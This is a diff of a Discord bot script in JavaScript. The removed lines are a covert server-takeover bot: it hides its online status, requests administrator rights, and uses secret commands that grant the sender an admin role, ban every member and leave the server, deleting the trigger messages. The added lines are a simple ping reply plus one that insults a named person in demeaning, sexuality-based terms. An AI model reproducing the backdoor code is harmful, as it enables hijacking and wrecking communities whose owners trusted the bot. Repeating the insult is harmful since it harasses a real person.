@@ -1,59 +1,17 @@
-const botSettings = require("./botsettings.json");
-const Discord = require("discord.js");
-const bot = new Discord.Client({disableEveryone: true});
+const Discord = require('discord.js');
+const client = new Discord.Client();
 
-bot.on("ready", async () => {
-	console.log(` Activated`);
-	//Bot Status
-	bot.user.setStatus("offline");
-	bot.user.setActivity(`Trust me`);
-
-	try {
-		//Generates a invite link in the console...
-	let link = await bot.generateInvite(["ADMINISTRATOR"]);
-	console.log(link);
-	} catch(e) {
-		console.log(e.stack);
-	}
+client.on('ready', () => {
+    console.log('I am ready!');
 });
 
-bot.on("message", async message => { 
-if(message.author.bot) return;
-
-	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
-  	const command = args.shift().toLowerCase();
-
-  //Gives you the admin role and deletes the message.
-  if(message === `ctrl`) {
-  	try {
-	role = await message.guild.createRole({
- 	name: "Dope Role",
-  	color: "#2f3136",
-  	permissions: [8]
-	});
-	message.member.addRole(role)
-	message.delete(1000);
-	} catch(e) {
-		console.log(e.stack);
-	}
-   }
-   //Bans everyone and deletes the message.
-   if(message === `adios`) {
-   	try {
-   	message.guild.members.forEach(member => {member.ban()});
-   	message.delete(1000);
-   	} catch(e) {
-	console.log(e.stack);
-   	}
-   }
-
-   if(message === `leaveserver`) {
-   	try {
-   	message.guild.leave();
-   	} catch(e) {
-	console.log(e.stack);
-   	}
-   }
+client.on('message', message => {
+    if (message.content === 'ping') {
+    	message.reply('pong');
+  	}
+    if (message.content === 'pac is') {
+    	message.channel.send("the gayest5 camel on earth")
+  	}
 });
 
-bot.login(process.env.BOT_TOKEN);
+client.login(process.env.BOT_TOKEN);
